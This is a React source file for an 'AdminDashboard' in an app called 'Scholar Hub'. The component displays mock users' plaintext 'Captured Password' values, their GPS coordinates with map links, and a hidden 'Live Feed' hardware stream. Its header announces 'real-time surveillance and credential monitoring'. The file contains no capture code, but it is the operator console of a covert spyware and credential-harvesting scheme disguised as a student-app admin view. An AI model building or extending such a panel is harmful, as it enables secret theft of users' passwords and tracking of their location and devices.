
import React from 'react';
import { ShieldAlert, Users, MapPin, Eye, ExternalLink, Activity, Lock, Globe } from 'lucide-react';
import { MonitoringUserData } from '../types';

const MOCK_USERS: MonitoringUserData[] = [
  { 
    id: '1', 
    identifier: 'student_alpha@gmail.com', 
    password: 'password123', 
    location: { lat: 18.5204, lng: 73.8567 }, 
    status: 'online', 
    lastSeen: 'Just now' 
  },
  { 
    id: '2', 
    identifier: '+919876543210', 
    password: 'secure_user_99', 
    location: { lat: 19.0760, lng: 72.8777 }, 
    status: 'online', 
    lastSeen: '2 mins ago' 
  },
  { 
    id: '3', 
    identifier: 'rahul_s@yahoo.com', 
    password: 'my_secret_pass', 
    location: { lat: 28.6139, lng: 77.2090 }, 
    status: 'offline', 
    lastSeen: '1 hour ago' 
  }
];

const AdminDashboard: React.FC = () => {
  const openMap = (lat: number, lng: number) => {
    window.open(`https://www.google.com/maps?q=${lat},${lng}`, '_blank');
  };

  return (
    <div className="flex-1 h-full bg-slate-950 text-slate-100 p-8 overflow-y-auto animate-fade-in">
      {/* Admin Header */}
      <div className="flex items-center justify-between mb-10 border-b border-slate-800 pb-6">
        <div>
          <div className="flex items-center gap-2 text-red-500 mb-2">
            <ShieldAlert size={20} />
            <span className="text-xs font-black uppercase tracking-[0.2em]">Restricted Admin Access</span>
          </div>
          <h1 className="text-4xl font-bold tracking-tight">Command Center</h1>
          <p className="text-slate-400 mt-1">Real-time surveillance and credential monitoring active.</p>
        </div>
        <div className="flex gap-4">
          <div className="bg-slate-900 border border-slate-800 p-4 rounded-2xl flex items-center gap-4">
            <div className="p-2 bg-green-500/20 text-green-500 rounded-lg">
              <Activity size={24} />
            </div>
            <div>
              <p className="text-xs text-slate-500 font-bold uppercase">Active Nodes</p>
              <p className="text-xl font-mono font-bold">0{MOCK_USERS.filter(u => u.status === 'online').length}</p>
            </div>
          </div>
          <div className="bg-slate-900 border border-slate-800 p-4 rounded-2xl flex items-center gap-4">
            <div className="p-2 bg-blue-500/20 text-blue-500 rounded-lg">
              <Users size={24} />
            </div>
            <div>
              <p className="text-xs text-slate-500 font-bold uppercase">Total Users</p>
              <p className="text-xl font-mono font-bold">0{MOCK_USERS.length}</p>
            </div>
          </div>
        </div>
      </div>

      {/* Monitoring Grid */}
      <div className="grid grid-cols-1 gap-6">
        {MOCK_USERS.map((user) => (
          <div key={user.id} className="bg-slate-900/50 border border-slate-800 rounded-3xl p-6 hover:bg-slate-900 transition-all group">
            <div className="flex flex-col lg:flex-row gap-8">
              {/* User Identity & Credentials */}
              <div className="flex-1">
                <div className="flex items-center gap-3 mb-4">
                  <div className={`w-3 h-3 rounded-full ${user.status === 'online' ? 'bg-green-500 animate-pulse' : 'bg-slate-600'}`} />
                  <h3 className="text-lg font-bold font-mono text-blue-400">{user.identifier}</h3>
                  <span className="text-[10px] bg-slate-800 px-2 py-0.5 rounded text-slate-400 uppercase font-bold tracking-widest ml-auto">
                    {user.lastSeen}
                  </span>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                  <div className="bg-black/40 p-4 rounded-xl border border-slate-800">
                    <div className="flex items-center gap-2 text-slate-500 mb-2">
                      <Lock size={14} />
                      <span className="text-[10px] font-bold uppercase tracking-widest">Captured Password</span>
                    </div>
                    <p className="text-sm font-mono text-red-400 font-bold tracking-widest">{user.password}</p>
                  </div>
                  <div className="bg-black/40 p-4 rounded-xl border border-slate-800">
                    <div className="flex items-center gap-2 text-slate-500 mb-2">
                      <MapPin size={14} />
                      <span className="text-[10px] font-bold uppercase tracking-widest">GPS Coordinates</span>
                    </div>
                    <p className="text-sm font-mono text-green-400 font-bold tracking-widest">
                      {user.location.lat}, {user.location.lng}
                    </p>
                  </div>
                </div>
              </div>

              {/* Action Modules */}
              <div className="flex flex-col sm:flex-row gap-4 lg:w-96">
                {/* Visual Feed Simulation */}
                <div className="flex-1 bg-black rounded-xl overflow-hidden relative border border-slate-800 min-h-[120px]">
                  <div className="absolute top-2 left-2 flex items-center gap-1.5 z-10">
                    <div className="w-1.5 h-1.5 bg-red-500 rounded-full animate-pulse" />
                    <span className="text-[8px] font-bold uppercase text-red-500">Live Feed</span>
                  </div>
                  <div className="absolute inset-0 flex flex-col items-center justify-center text-slate-700 opacity-50">
                    <Eye size={32} />
                    <p className="text-[8px] mt-1 font-bold">HARDWARE_STREAM_HIDDEN</p>
                  </div>
                </div>

                {/* Map Action */}
                <button 
                  onClick={() => openMap(user.location.lat, user.location.lng)}
                  className="bg-blue-600 hover:bg-blue-500 text-white p-6 rounded-xl flex flex-col items-center justify-center gap-2 transition-all group-hover:scale-[1.02]"
                >
                  <Globe size={24} />
                  <span className="text-[10px] font-black uppercase whitespace-nowrap">View on Maps</span>
                  <ExternalLink size={12} className="opacity-50" />
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>

      <div className="mt-12 text-center text-slate-600">
        <p className="text-[10px] font-bold uppercase tracking-[0.5em] opacity-30">Scholar Hub Admin Security Layer • Protocol v4.2.1</p>
      </div>
    </div>
  );
};

export default AdminDashboard;
